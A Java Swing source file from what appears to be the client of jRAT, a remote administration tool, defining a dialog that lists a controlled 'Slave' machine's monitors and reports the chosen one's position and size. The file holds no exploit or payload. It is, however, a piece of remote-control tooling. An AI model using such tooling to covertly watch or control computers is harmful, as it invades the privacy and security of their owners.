package io.jrat.client.ui.dialogs;

import io.jrat.client.Slave;
import io.jrat.client.listeners.PickMonitorListener;

import java.awt.BorderLayout;
import java.awt.FlowLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;

import com.redpois0n.graphs.monitors.MonitorListener;
import com.redpois0n.graphs.monitors.PanelMonitors;
import com.redpois0n.graphs.monitors.PanelMonitors.PanelMonitor;
import com.redpois0n.graphs.monitors.RemoteMonitor;

@SuppressWarnings("serial")
public class DialogPickMonitor extends JDialog {

	private final JPanel contentPanel = new JPanel();
	private PanelMonitors panelMonitors;
	private JLabel label;

	public DialogPickMonitor(Slave sl, final PickMonitorListener l) {
		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
		setTitle("Pick Monitor");
		setResizable(false);
		setBounds(100, 100, 450, 300);
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(new BoxLayout(contentPanel, BoxLayout.X_AXIS));
		{
			panelMonitors = new PanelMonitors(sl.getMonitors(), false);

			panelMonitors.addListener(new MonitorListener() {
				@Override
				public void onMonitorChange(RemoteMonitor monitor) {
					PanelMonitor panel = null;

					for (PanelMonitor panel1 : panelMonitors.getPanels()) {
						if (panel1.getMonitor().equals(monitor)) {
							panel = panel1;
							break;
						}
					}

					if (panel != null) {
						label.setText("X, Y: " + panel.getMonitor().getX() + ", " + panel.getMonitor().getY() + " - " + panel.getMonitor().getWidth() + "x" + panel.getMonitor().getHeight());
						l.monitorPick(panel.getMonitor());
					}
				}
			});
			contentPanel.add(panelMonitors);
		}
		{
			JPanel buttonPane = new JPanel();
			buttonPane.setLayout(new FlowLayout(FlowLayout.RIGHT));
			getContentPane().add(buttonPane, BorderLayout.SOUTH);
			{
				JButton okButton = new JButton("OK");
				okButton.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						setVisible(false);
						dispose();
					}
				});
				{
					label = new JLabel("");
					buttonPane.add(label);
				}
				okButton.setActionCommand("OK");
				buttonPane.add(okButton);
				getRootPane().setDefaultButton(okButton);
			}
			{
				JButton cancelButton = new JButton("Cancel");
				cancelButton.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent arg0) {
						setVisible(false);
						dispose();
					}
				});
				cancelButton.setActionCommand("Cancel");
				buttonPane.add(cancelButton);
			}
		}
	}

}
